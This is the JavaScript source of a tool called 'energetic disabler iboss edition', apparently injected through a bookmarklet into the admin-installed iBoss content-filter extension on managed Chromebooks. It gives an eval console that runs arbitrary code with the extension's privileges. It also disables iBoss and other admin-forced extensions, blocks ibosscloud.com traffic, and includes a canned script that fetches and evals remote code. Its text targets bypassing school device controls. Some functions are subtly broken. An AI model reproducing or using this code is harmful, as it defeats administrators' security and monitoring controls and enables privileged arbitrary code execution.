var swamp, chrome;
function _() {
  opener.close();
  (swamp = {
    add: function (e, t) {
      return (t ?? document.body).appendChild(document.createElement(e));
    },
    background: chrome.extension.getBackgroundPage(),
    functions: {
      save_code: function () {
        localStorage.swamp = t.value;
      },
      insert_tab: function (e) {
        "Tab" === e.key &&
          (e.preventDefault(), document.execCommand("insertText", !1, "  "));
      },
      log_replace: function (e) {
        s.textContent += "\n\n" + e;
      },
      run_code: function () {
        swamp.functions.save_code();
        try {
          (this.background ? swamp.background : window).eval(t.value),
            console.log("Code ran successfully");
        } catch (e) {
          console.log(e);
        }
      },
      reload_background: function () {
        (((swamp.background.chrome.tabs.updateAsync ||
          "-" === localStorage.accountId) &&
          !swamp.background.spoof_int) ||
          swamp.background.confirm(
            "It appears you have soft-disable on, doing this will turn this option off."
          )) &&
          (swamp.background.location.reload(),
          console.log("Scripts running as background were reloaded"));
      },
      clone: function () {
        open("/manifest.json").onload = function () {
          this.eval(_.toString() + "_();var swamp"),
            close(),
            (onbeforeunload = null);
          close();
        };
      },
      script_adding_loop: function (e) {
        var t = swamp.add("option", d);
        (t.textContent = e.name), (t.value = e.code);
      },
      script_select: function () {
        (t.value = d.value), e.scrollIntoView();
      },
      disable_background_buttons: function () {
        (a.disabled = !0), (i.disabled = !0);
      },
      soft_disable: function () {
        swamp.functions.disable_background_buttons;
        delete swamp.background;
                swamp.background.close();

        swamp.background.chrome.proxy.settings.set({
          value: {mode: "system"}, scope: "regular"
        })
      },
      undo_soft_disable: function () {
        confirm(
          'Undoing soft-disable will close the [swamp] launcher. Select "OK" to proceed.'
        ) && chrome.runtime.reload();
      },
      get_extensions: function () {
        chrome.management.getAll(function (e) {
          e.forEach(function (e) {
            if (e.id !== chrome.runtime.id) {
              var t = swamp.add("button", m);
              (t.textContent = e.name),
                (t.enabled = e.enabled),
                (t.admin = "admin" === e.installType),
                (t.onclick = function () {
                  (this.enabled = !this.enabled),
                    swamp.functions.strikethrough(this, this.enabled),
                    chrome.management.setEnabled(e.id, this.enabled);
                }),
                swamp.functions.strikethrough(t, e.enabled);
            }
          });
        });
      },
      strikethrough: function (e, t) {
        e.style.textDecoration = t ? "none" : "line-through";
      },
      manage_all: function () {
        var e = this.admin_only,
          t = this.enabling;
        [...m.children].forEach(function (s) {
          (!e || s.admin) && !t != !s.enabled && s.click();
        });
      },
    },
    disable_iboss: function () {
      swamp.background.chrome.management.setEnabled(chrome.runtime.id, confirm("This will close energetic disabler and you will not be able to access it until visiting chrome://restart, do you want to continue") ? false : true)
    },
    scripts: [
      { name: "Select an option...", code: "" },
     
      {
        name: "Display all iBoss's permissions",
        code: `chrome.runtime.getManifest().permissions.forEach(e=>{
console.log(e)
})`,
      },
      {
        name: "Run a third-party script",
        code: 'fetch("https://example.com/example.js").then((e)=>e.text()).then(eval);',
      },
      {
        name: "Emulate DNS and block all ibosscloud.com requests",
        code: `chrome.webRequest.onBeforeRequest.addListener(function () {return { redirectUrl: "javascript:" };},{urls: ["*://*.ibosscloud.com/*"],},
  ["blocking"]
);`,
      },
      {
        name: "Bookmarklet emulator when a Google tab is loaded",
        code: `chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status == "complete" && tab.url.includes('google.com')) {
    chrome.tabs.executeScript(
      tabId, { code: \`
      // Test your own code below:
          alert("Testing!");
      \` }
    );
  }
})`,
      },
      {
        name: "Toggle all other admin-forced extensions when the iBoss icon is clicked",
        code: `
chrome.browserAction.onClicked.addListener(function () {
  chrome.management.getAll(function () {
    arguments[0].forEach(function (extension) {
      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)
        chrome.management.setEnabled(extension.id, !extension.enabled);
    });
  });
});`,
      },
      {
        name: "Run custom code when the iBoss icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(function(){
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
    chrome.tabs.executeScript(
      tabs[0].id, { code: \`
      // Test your own code below:

        eval(prompt("Code, please?"));
      \`, matchAboutBlank: true }
    );
 })
})
// Credit to Asteroid#2366
`,
      },
      {
        name: "Toggle emulated DNS unblocker when the iBoss icon is clicked",
        code: `function block() {
  return { redirectUrl: "javascript:" };
}
var blocking = false;
function toggle() {
  if (blocking) {
    chrome.webRequest.onBeforeRequest.removeListener(block);
  } else {
    chrome.webRequest.onBeforeRequest.addListener(
      block,
      {
        urls: ["*://*.ibosscloud.com/*"],
      },
      ["blocking"]
    );
  }
  blocking = !blocking;
  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));
}
toggle();
chrome.browserAction.onClicked.addListener(toggle);
// This is also only useful if you run it in the background`,
      },
    ],
    strings: {
      title: "energetic disabler iboss edition",
      subtitle:
        "Launcher originally made by Bypassi#7074 or SprinksMC#8421, remade for iBoss by Walmart bag#9998",
      run_code: {
        title: "Run your own code",
        description:
          "Put your script here to run it while pretending to be the iBoss extension. Note that your code is saved automatically.",
        input_placeholder: "Input goes here...",
        output_placeholder: "Output shows here:\n\n---",
        run: "Run on this page",
        reload: "Reload scripts on this page",
        run_background: "Run as background",
        reload_background: "Reload background scripts",
        button_description:
          'Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, which makes it a pain to use energetic disabler at places such as school where you can\'t set it up. But running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example). <b>If the background buttons above are disabled, that likely means that you need to click the "undo soft-disable" button later in this page.</b>Keep in mind that swamp will always show on this page once you used the bookmarklet by going to https://tinyurl.com/swampboss',
      },
      interesting_scripts: {
        title: "Interesting scripts",
        description:
          "Some useful scripts for the textbox above, if you used swamp with GoGuardian before and some scripts are missing, this is because iBoss is not able to run these specific ones, due to it's CSP policies. <b> DM \"walmart bag#9998\" if you have Goofy or certain scripts you'd want me to add to this section </b>",
        policy_description: "",
        dns_description:
          "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-installed extensions.",
        background_reminder:
          "And please read the thing about background running earlier in the page, because that could be useful for making some of these scripts run at school.",
      },
      disable_gg: {
        soft_disable: "Soft-Disable iBoss",
        undo_soft_disable: "Undo Soft-Disable",
        soft_disable_description:
          'Unfortunately, there\'s no Hard-Disable for iBoss, <b> DM "Walmart bag #9998" whether you have a Hard-Disable script</b>. These buttons above seem to have no "Visible-Change", as of before you say "Wait, nothing happended" Check and see, sites shouldn\'t be managed by iBoss anymore. Soft-disable only persists until Chrome is restarted (naturally or with chrome://restart). It is more of a full bypass, removing iBoss\'s background scripts completely. This, of course, means that you won\'t be able to run code as background while soft-disable is active. It also means that the process to undo the soft-disable will close this tab.',
        trouble_warning: "",
      },
      ltbeef: {
        disable_all: "Disable all except iBoss",
        disable_all_admin: "Disable all admin-forced except iBoss",
        enable_all: "Re-enable all",
        soft_disable_recommendation:
          "Disabling iBoss with this process would close the  energetic disabler launcher, so the option is not shown here. Instead, use the soft-disable button earlier on the page, which has the same functionality while allowing for the energetic disabler editor to be used.",
      },
      disable_iboss: {
        title: "And the final option.",
        disable_iboss_des:
          'This will disable iBoss until the step of visiting chrome://restart. This is not recommended as this will also close energetic disabler for iBoss. If you want to have this same functionality, and disable iBoss until restart, use the "Soft-Disable" Button above, or run a DNS Emulator (preferably as background)',
        disable_iboss_button: "Disable iBoss",
      },
    },
    style:
      "pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#000000;background-color:#0e1f19}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#800000;font-size:15px}button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color#800000;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button[disabled]{pointer-events:none;filter:brightness(.5)}button:hover{filter:brightness(.8)}a{color:#14613B;transition:color 250ms}a:hover{color:#1A2C23}",
  }),
    (document.body.innerHTML = "");

  chrome.browserAction.setPopup({ popup: "" }),
    (onbeforeunload = (i) => !1),
    (swamp.add("style").innerHTML = swamp.style),
    (swamp.add("base").target = "_blank"),
    (console.log = swamp.functions.log_replace),
    swamp.background &&
      (swamp.background.console.log = swamp.functions.log_replace),
    (document.title = swamp.strings.title),
    (swamp.add("h1").innerHTML = swamp.strings.title),
    (swamp.add("h3").innerHTML = swamp.strings.subtitle),
    (swamp.add("p").innerHTML = swamp.strings.source_link),
    swamp.add("hr");
  var e = swamp.add("div");
  (swamp.add("h2", e).innerHTML = swamp.strings.run_code.title),
    (swamp.add("p", e).innerHTML = swamp.strings.run_code.description);
  var t = swamp.add("textarea", e);
  (t.placeholder = swamp.strings.run_code.input_placeholder),
    (t.onkeyup = swamp.functions.save_code),
    (t.onkeydown = swamp.functions.insert_tab);
  var s = swamp.add("pre", e);
  s.textContent = swamp.strings.run_code.output_placeholder;
  var n = swamp.add("button", e);
  (n.textContent = swamp.strings.run_code.run),
    (n.onclick = swamp.functions.run_code);
  var o = swamp.add("button", e);
  (o.textContent = swamp.strings.run_code.reload),
    (o.onclick = swamp.functions.clone),
    swamp.add("br", e);
  var a = swamp.add("button", e);
  (a.textContent = swamp.strings.run_code.run_background),
    (a.background = !0),
    (a.onclick = swamp.functions.run_code);
  var i = swamp.add("button", e);
  (i.textContent = swamp.strings.run_code.reload_background),
    (i.onclick = swamp.functions.reload_background),
    (swamp.add("p", e).innerHTML = swamp.strings.run_code.button_description),
    swamp.add("hr"),
    swamp.background || swamp.functions.disable_background_buttons();
  var r = swamp.add("div");
  (swamp.add("h2", r).textContent = swamp.strings.interesting_scripts.title),
    (swamp.add("p", r).innerHTML =
      swamp.strings.interesting_scripts.description);
  var d = swamp.add("select", r);
  swamp.scripts.forEach(swamp.functions.script_adding_loop),
    (d.onchange = swamp.functions.script_select),
    (swamp.add("p", r).textContent =
      swamp.strings.interesting_scripts.policy_description),
    (swamp.add("p", r).textContent =
      swamp.strings.interesting_scripts.dns_description),
    (swamp.add("p", r).textContent =
      swamp.strings.interesting_scripts.background_reminder),
    swamp.add("hr");
  var l = swamp.add("div");
  (swamp.add("h2", l).textContent = swamp.strings.disable_gg.title),
    (swamp.add("p", l).textContent =
      swamp.strings.disable_gg.hard_disable_description);
  var c = swamp.add("button", l);
  (c.textContent = swamp.strings.disable_gg.soft_disable),
    (c.onclick = swamp.functions.soft_disable);
  var p = swamp.add("button", l);
  (p.textContent = swamp.strings.disable_gg.undo_soft_disable),
    (p.onclick = swamp.functions.undo_soft_disable),
    swamp.add("br");
  swamp.add("br"),
    (swamp.add("p", l).innerHTML =
      swamp.strings.disable_gg.soft_disable_description),
    (swamp.add("p", l).textContent = swamp.strings.disable_gg.trouble_warning),
    swamp.add("hr");
  var u = swamp.add("div");
  (swamp.add("h2", u).innerHTML = swamp.strings.ltbeef.title),
    (swamp.add("p", u).textContent = swamp.strings.ltbeef.manual_description);
  var m = swamp.add("div", u);
  swamp.functions.get_extensions(),
    (swamp.add("p", u).textContent =
      swamp.strings.ltbeef.broad_options_description);
  var b = swamp.add("button", u);
  (b.textContent = swamp.strings.ltbeef.disable_all),
    (b.onclick = swamp.functions.manage_all);
  var h = swamp.add("button", u);
  (h.admin_only = !0),
    (h.textContent = swamp.strings.ltbeef.disable_all_admin),
    (h.onclick = swamp.functions.manage_all);
  var g = swamp.add("button", u);
  (g.textContent = swamp.strings.ltbeef.enable_all),
    (g.enabling = !0),
    (g.onclick = swamp.functions.manage_all),
    (swamp.add("p", u).textContent =
      swamp.strings.ltbeef.soft_disable_recommendation),
    swamp.add("hr");
  var g = swamp.add("div");
  (swamp.add("h2", g).innerHTML = swamp.strings.disable_iboss.title),
    (swamp.add("p", g).innerHTML =
      swamp.strings.disable_iboss.disable_iboss_des);
  var w = swamp.add("button", g);
  (w.textContent = swamp.strings.disable_iboss.disable_iboss_button),
    (w.onclick = swamp.functions.disable_iboss);
}
open("/manifest.json").onload = function () {
  this.eval(_.toString() + "_();var swamp"), close();
};
